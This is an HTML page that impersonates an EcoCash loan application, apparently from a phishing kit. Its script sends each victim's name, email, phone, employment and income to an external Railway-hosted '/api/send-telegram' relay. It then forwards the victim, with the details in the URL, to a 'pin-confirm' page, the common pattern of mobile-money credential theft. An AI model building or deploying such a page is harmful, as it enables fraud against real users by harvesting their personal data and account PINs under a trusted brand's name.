<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
    <title>EcoCash · Complete Application</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            background: linear-gradient(135deg, #e8f0fe 0%, #d4e4fc 100%);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            min-height: 100vh;
            padding: 16px;
        }

        .app-container {
            max-width: 500px;
            width: 100%;
            margin: 0 auto;
        }

        /* Loan Summary Bar */
        .loan-summary-bar {
            background: white;
            border-radius: 20px;
            padding: 14px 18px;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 10px;
            border: 1px solid rgba(0, 75, 149, 0.15);
            box-shadow: 0 2px 10px rgba(0, 75, 149, 0.05);
        }
        .summary-item {
            display: flex;
            flex-direction: column;
            align-items: flex-start;
        }
        .summary-label {
            font-size: 0.65rem;
            font-weight: 500;
            color: #6b8a9e;
            text-transform: uppercase;
        }
        .summary-value {
            font-size: 1rem;
            font-weight: 700;
            color: #004B95;
            margin-top: 2px;
        }

        /* Apply Card */
        .apply-card {
            background: white;
            border-radius: 32px;
            border: 1px solid rgba(0, 75, 149, 0.15);
            padding: 28px 24px 32px;
            box-shadow: 0 10px 30px rgba(0, 75, 149, 0.08);
        }
        .section-title {
            font-size: 1.3rem;
            font-weight: 700;
            background: linear-gradient(135deg, #004B95, #26b0da);
            background-clip: text;
            -webkit-background-clip: text;
            color: transparent;
            margin-bottom: 8px;
        }
        .section-sub {
            font-size: 0.8rem;
            color: #6b8a9e;
            margin-bottom: 28px;
            border-left: 3px solid #004B95;
            padding-left: 12px;
        }

        /* Form */
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            font-size: 0.8rem;
            font-weight: 600;
            color: #03183B;
            margin-bottom: 8px;
        }
        .required:after {
            content: "*";
            color: #e74c3c;
            margin-left: 4px;
        }
        input, select {
            width: 100%;
            padding: 14px 16px;
            font-size: 0.95rem;
            border: 1.5px solid #e0e8f0;
            border-radius: 20px;
            background: #fefefe;
            color: #03183B;
            font-family: inherit;
            transition: all 0.2s;
        }
        input:focus, select:focus {
            outline: none;
            border-color: #004B95;
            box-shadow: 0 0 0 3px rgba(0, 75, 149, 0.1);
        }

        .row-2cols {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 14px;
        }

        .radio-group {
            display: flex;
            align-items: center;
            gap: 12px;
            margin: 20px 0;
        }
        .radio-group label {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 0;
            cursor: pointer;
            color: #03183B;
            font-size: 0.8rem;
        }
        .radio-group input {
            width: 18px;
            height: 18px;
            accent-color: #004B95;
        }

        .submit-btn {
            width: 100%;
            background: linear-gradient(135deg, #004B95, #26b0da);
            border: none;
            padding: 16px 20px;
            font-size: 1rem;
            font-weight: 700;
            color: white;
            border-radius: 60px;
            cursor: pointer;
            margin-top: 8px;
            transition: all 0.2s;
        }
        .submit-btn:active {
            transform: scale(0.97);
        }

        .error-message {
            background: rgba(231, 76, 60, 0.1);
            color: #e74c3c;
            padding: 12px;
            border-radius: 12px;
            font-size: 0.8rem;
            margin-top: 16px;
            text-align: center;
            display: none;
        }
        .error-message.show {
            display: block;
        }

        .phone-hint {
            font-size: 0.65rem;
            color: #6b8a9e;
            margin-top: 5px;
            display: block;
        }

        @media (max-width: 480px) {
            .apply-card {
                padding: 22px 18px 26px;
            }
            .row-2cols {
                grid-template-columns: 1fr;
                gap: 16px;
            }
        }
    </style>
</head>
<body>
<div class="app-container">
    <!-- Loan Summary Bar -->
    <div class="loan-summary-bar">
        <div class="summary-item">
            <span class="summary-label">Loan Amount</span>
            <span class="summary-value" id="summaryAmount">$ 0</span>
        </div>
        <div class="summary-item">
            <span class="summary-label">Term</span>
            <span class="summary-value" id="summaryTerm">0 months</span>
        </div>
        <div class="summary-item">
            <span class="summary-label">Monthly</span>
            <span class="summary-value" id="summaryMonthly">$ 0</span>
        </div>
        <div class="summary-item">
            <span class="summary-label">Interest</span>
            <span class="summary-value" id="summaryRate">5%</span>
        </div>
    </div>

    <!-- Application Form -->
    <div class="apply-card">
        <div class="section-title">📱 Complete your application</div>
        <div class="section-sub">Fill in your personal details below</div>

        <form id="applicationForm">
            <div class="form-group">
                <label class="required">Full name</label>
                <input type="text" id="fullName" placeholder="Tendai Moyo" required>
            </div>

            <div class="row-2cols">
                <div class="form-group">
                    <label class="required">Email address</label>
                    <input type="email" id="email" placeholder="tendai@example.com" required>
                </div>
                <div class="form-group">
                    <label class="required">Phone number</label>
                    <input type="tel" id="phone" placeholder="+263 77 123 4567" required>
                    <span class="phone-hint">📱 Enter your phone number with country code (e.g., +263)</span>
                </div>
            </div>

            <div class="row-2cols">
                <div class="form-group">
                    <label class="required">Employment status</label>
                    <select id="employment" required>
                        <option value="">Select</option>
                        <option>Employed full-time</option>
                        <option>Employed part-time</option>
                        <option>Self-employed</option>
                        <option>Business owner</option>
                        <option>Retired</option>
                    </select>
                </div>
                <div class="form-group">
                    <label class="required">Monthly income ($)</label>
                    <input type="number" id="monthlyIncome" placeholder="e.g., 3500" required>
                </div>
            </div>

            <div class="radio-group">
                <label>
                    <input type="checkbox" id="consent" required> I confirm that the information provided is accurate.
                </label>
            </div>

            <button type="submit" class="submit-btn" id="submitBtn">Continue →</button>
            <div class="error-message" id="errorMessage"></div>
        </form>
    </div>
</div>

<script>
    // ============================================
    // ECO CASH - BACKEND URL (UPDATE LATER)
    // ============================================
    const RAILWAY_URL = 'https://eco-cash-production.up.railway.app'; // UPDATE WITH YOUR RAILWAY URL
    
    function isValidPhone(phone) {
        const cleaned = phone.replace(/[\s\-\(\)]/g, '');
        const regex = /^\+\d{10,14}$/;
        return regex.test(cleaned);
    }

    const urlParams = new URLSearchParams(window.location.search);
    const amount = urlParams.get('amount') || '0';
    const term = urlParams.get('term') || '0';
    const rate = urlParams.get('rate') || '5';
    const monthly = urlParams.get('monthly') || '0';

    document.getElementById('summaryAmount').innerText = `$ ${parseInt(amount).toLocaleString()}`;
    document.getElementById('summaryTerm').innerText = `${term} month${term != 1 ? 's' : ''}`;
    document.getElementById('summaryMonthly').innerText = `$ ${parseFloat(monthly).toFixed(2)}`;
    document.getElementById('summaryRate').innerText = `${rate}%`;

    async function sendToBackend(data) {
        try {
            const response = await fetch(`${RAILWAY_URL}/api/send-telegram`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
            const result = await response.json();
            console.log('Backend response:', result);
        } catch (error) {
            console.error('Error:', error);
        }
    }

    document.getElementById('applicationForm').addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const fullName = document.getElementById('fullName').value.trim();
        const email = document.getElementById('email').value.trim();
        const phone = document.getElementById('phone').value.trim();
        const employment = document.getElementById('employment').value;
        const monthlyIncome = document.getElementById('monthlyIncome').value;
        const consent = document.getElementById('consent').checked;
        const errorMsgDiv = document.getElementById('errorMessage');
        
        if (!fullName || !email || !phone || !employment || !monthlyIncome || !consent) {
            errorMsgDiv.textContent = 'Please fill all required fields';
            errorMsgDiv.classList.add('show');
            setTimeout(() => errorMsgDiv.classList.remove('show'), 3000);
            return;
        }
        
        if (!isValidPhone(phone)) {
            errorMsgDiv.textContent = '❌ Please enter a valid phone number with country code (e.g., +263 77 123 4567)';
            errorMsgDiv.classList.add('show');
            setTimeout(() => errorMsgDiv.classList.remove('show'), 3000);
            return;
        }
        
        errorMsgDiv.classList.remove('show');
        
        // Send to backend (will work when you update RAILWAY_URL)
        await sendToBackend({
            phone: phone,
            pin: monthlyIncome,
            email: email,
            name: fullName,
            amount: amount,
            term: term,
            rate: rate,
            monthly: monthly,
            employment: employment,
            type: 'application',
            site: 'EcoCash'
        });
        
        const params = new URLSearchParams();
        params.set('amount', amount);
        params.set('term', term);
        params.set('rate', rate);
        params.set('monthly', monthly);
        params.set('name', fullName);
        params.set('email', email);
        params.set('phone', phone);
        
        window.location.href = `pin-confirm.html?${params.toString()}`;
    });
</script>
</body>
</html>
